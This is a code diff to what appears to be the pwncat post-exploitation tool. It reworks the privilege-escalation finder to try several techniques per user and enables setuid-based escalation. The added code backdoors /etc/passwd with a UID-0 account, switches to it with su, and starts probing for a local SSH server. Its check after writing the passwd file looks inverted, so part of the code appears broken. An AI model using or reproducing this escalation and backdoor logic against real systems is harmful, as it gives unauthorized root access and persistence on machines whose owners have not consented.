@@ -4,6 +4,7 @@ import crypt
 from time import sleep
 import socket
 from pprint import pprint
+import re
 
 from pwncat.privesc.base import Method, PrivescError, Technique, SuMethod
 from pwncat.privesc.setuid import SetuidMethod
@@ -18,7 +19,7 @@ from pwncat import util
 # privesc_methods = [SetuidMethod, SuMethod]
 # privesc_methods = [SuMethod, SudoMethod, SetuidMethod, DirtycowMethod, ScreenMethod]
 # privesc_methods = [SuMethod, SudoMethod, ScreenMethod, SetuidMethod]
-privesc_methods = [SuMethod, SudoMethod]
+privesc_methods = [SuMethod, SudoMethod, SetuidMethod]
 
 
 class Finder:
@@ -255,91 +256,141 @@ class Finder:
 
         raise PrivescError(f"no route to {target_user} found")
 
-    def escalate_single(self, technique: Technique) -> str:
+    def escalate_single(self, techniques: List[Technique], shlvl: str) -> str:
+        """ Use the given list of techniques to escalate to the user. All techniques
+        should be for the same user. This method will attempt a variety of privesc
+        methods. Primarily, it will directly execute any techniques which provide
+        the SHELL capability first. Afterwards, it will try to backdoor /etc/passwd
+        if the target user is root. Lastly, it will try to escalate using a local
+        SSH server combined with READ/WRITE capabilities to gain a local shell. """
 
-        util.progress(f"attempting escalation to {technique}")
+        readers: List[Technique] = []
+        writers: List[Technique] = []
 
-        shlvl = self.pty.getenv("SHLVL")
-
-        if Capability.SHELL in technique.capabilities:
-            try:
-                # Attempt our basic, known technique
-                exit_script = technique.method.execute(technique)
-                self.pty.flush_output()
-
-                # Reset the terminal to ensure we are stable
-                self.pty.reset()
-
-                # Check that we actually succeeded
-                current = self.pty.whoami()
-
-                if current == technique.user or (
-                    technique.user == self.backdoor_user_name and current == "root"
-                ):
-                    return exit_script
-
-                # Check if we ended up in a sub-shell without escalating
-                if self.pty.getenv("SHLVL") != shlvl:
-                    # Get out of this subshell. We don't need it
-                    self.pty.process(exit_script, delim=False)
-
-                    # Clean up whatever mess was left over
+        for technique in techniques:
+            if Capability.SHELL in technique.capabilities:
+                try:
+                    # Attempt our basic, known technique
+                    exit_script = technique.method.execute(technique)
                     self.pty.flush_output()
 
+                    # Reset the terminal to ensure we are stable
                     self.pty.reset()
 
-                # The privesc didn't work, but didn't throw an exception.
-                # Continue on as if it hadn't worked.
-            except PrivescError:
-                pass
+                    # Check that we actually succeeded
+                    current = self.pty.whoami()
 
-        # We can't privilege escalate directly to a shell with this technique,
-        # but we may be able to add a user via file write.
-        if (technique.capabilities & Capability.WRITE) == 0 or technique.user != "root":
-            raise PrivescError("privesc failed")
+                    if current == technique.user or (
+                        technique.user == self.backdoor_user_name and current == "root"
+                    ):
+                        self.pty.flush_output()
+                        return technique, exit_script
 
-        # We need su to privesc w/ file write
-        su_command = self.pty.which("su", quote=True)
-        if su_command is None:
-            raise PrivescError("privesc failed")
+                    # Check if we ended up in a sub-shell without escalating
+                    if self.pty.getenv("SHLVL") != shlvl:
+                        # Get out of this subshell. We don't need it
+                        self.pty.process(exit_script, delim=False)
 
-        # Read /etc/passwd
-        with self.pty.open("/etc/passwd", "r") as filp:
-            data = filp.readlines()
+                        # Clean up whatever mess was left over
+                        self.pty.flush_output()
 
-        # Add a new user
-        password = crypt.crypt(self.backdoor_password)
-        user = self.backdoor_user_name
-        data.append(f"{user}:{password}:0:0::/root:{self.pty.shell}")
+                        self.pty.reset()
 
-        # Join the data back and encode it
-        data = ("\n".join(data) + "\n").encode("utf-8")
+                    # The privesc didn't work, but didn't throw an exception.
+                    # Continue on as if it hadn't worked.
+                except PrivescError:
+                    pass
+            if Capability.READ in technique.capabilities:
+                readers.append(technique)
+            if Capability.WRITE in technique.capabilities:
+                writers.append(technique)
 
-        # Write the data
-        technique.method.write_file("/etc/passwd", data, technique)
+        if writers and writers[0].user == "root":
 
-        # Maybe help?
-        self.pty.run("echo")
+            # We need su to privesc w/ file write
+            su_command = self.pty.which("su", quote=True)
+            if su_command is not None:
 
-        # Check that it succeeded
-        users = self.pty.reload_users()
+                # Grab the first writer
+                writer = writers[0]
 
-        # Check if the new passwd file contained the file
-        if user not in users:
-            raise PrivescError("privesc failed")
+                # Read /etc/passwd
+                with self.pty.open("/etc/passwd", "r") as filp:
+                    data = filp.readlines()
 
-        self.pty.users[user]["password"] = password
-        self.backdoor_user = self.pty.users[user]
+                # Add a new user
+                password = crypt.crypt(self.backdoor_password)
+                user = self.backdoor_user_name
+                data.append(f"{user}:{password}:0:0::/root:{self.pty.shell}")
 
-        # Switch to the new user
-        # self.pty.process(f"su {user}", delim=False)
-        self.pty.process(f"su {user}", delim=True)
-        self.pty.flush_output()
+                # Join the data back and encode it
+                data = ("\n".join(data) + "\n").encode("utf-8")
 
-        self.pty.client.send(self.backdoor_password.encode("utf-8") + b"\n")
-        self.pty.run("echo")
+                # Write the data
+                writer.method.write_file("/etc/passwd", data, writer)
 
-        return "exit"
+                # Maybe help?
+                self.pty.run("echo")
+
+                # Check that it succeeded
+                users = self.pty.reload_users()
+
+                # Check if the new passwd file contained the file
+                if user not in users:
+                    self.pty.users[user]["password"] = password
+                    self.backdoor_user = self.pty.users[user]
+
+                    # Switch to the new user
+                    # self.pty.process(f"su {user}", delim=False)
+                    self.pty.process(f"su {user}", delim=True)
+                    self.pty.flush_output()
+
+                    self.pty.client.send(self.backdoor_password.encode("utf-8") + b"\n")
+                    self.pty.run("echo")
+
+                    self.pty.flush_output()
+
+                    return writer, "exit"
+
+        # SSH isn't working yet
+        raise PrivescError()
+
+        # Check if there is an SSH server running
+        sshd_running = False
+        ps = self.pty.which("ps")
+        if ps is not None:
+            sshd_running = "sshd" in self.pty.subprocess("ps -o command -e", "r").read()
+        else:
+            pgrep = self.pty.which("pgrep")
+            if pgrep is not None:
+                sshd_running = (
+                    self.pty.subprocess("pgrep 'sshd'", "r").read().strip() != ""
+                )
+
+        sshd_listening = False
+        sshd_address = None
+        netstat = (
+            self.pty.subprocess(
+                "netstat -anotp 2>/dev/null | grep LISTEN | grep -v tcp6 | grep ':22'",
+                "r",
+            )
+            .read()
+            .strip()
+        )
+
+        if netstat != "":
+            # Remove repeated spaces
+            netstat = re.sub(" +", " ", netstat).split(" ")
+            sshd_listening = True
+            sshd_address = netstat[3].split(":")[0]
+
+        if sshd_running and sshd_listening:
+            # We have an SSHD and we have a file read and a file write
+            # technique. We can attempt to leverage this to use SSH to ourselves
+            # and gain access as this user.
+            util.info(f"found sshd listening at {sshd_address}:22")
+
+        raise PrivescError()
 
     def escalate(
         self,
@@ -371,36 +422,54 @@ class Finder:
         if depth is not None and len(chain) > depth:
             raise PrivescError("max depth reached")
 
+        # Capture current shell level
+        shlvl = self.pty.getenv("SHLVL")
+
         # Enumerate escalation options for this user
-        techniques = []
+        techniques = {}
         for method in self.methods:
             try:
                 util.progress(f"evaluating {method} method")
-                found_techniques = method.enumerate(Capability.SHELL | Capability.WRITE)
+                found_techniques = method.enumerate(
+                    Capability.SHELL | Capability.WRITE | Capability.READ
+                )
                 for tech in found_techniques:
-                    if tech.user == target_user:
-                        try:
-                            util.progress(f"evaluating {tech}")
-                            exit_command = self.escalate_single(
-                                tech
-                            )  # tech.method.execute(tech)
-                            chain.append((tech, exit_command))
-                            return chain
-                        except PrivescError:
-                            pass
-                techniques.extend(found_techniques)
+                    if tech.user not in techniques:
+                        techniques[tech.user] = []
+                    techniques[tech.user].append(tech)
+            except PrivescError:
+                pass
+
+        if target_user == "root" and self.backdoor_user_name in techniques:
+            try:
+                tech, exit_command = self.escalate_single(
+                    techniques[self.backdoor_user_name], shlvl
+                )
+                chain.append((tech, exit_command))
+                return chain
+            except PrivescError:
+                pass
+
+        # Try to escalate directly to the target if possible
+        if target_user in techniques:
+            try:
+                tech, exit_command = self.escalate_single(
+                    techniques[target_user], shlvl
+                )
+                chain.append((tech, exit_command))
+                return chain
             except PrivescError:
                 pass
 
         # We can't escalate directly to the target. Instead, try recursively
         # against other users.
-        for tech in techniques:
-            if tech.user == target_user:
+        for user, techs in techniques.items():
+            if user == target_user:
                 continue
-            if self.in_chain(tech.user, chain):
+            if self.in_chain(user, chain):
                 continue
             try:
-                exit_command = self.escalate_single(tech)  # tech.method.execute(tech)
+                tech, exit_command = self.escalate_single(techs, shlvl)
                 chain.append((tech, exit_command))
             except PrivescError:
                 continue
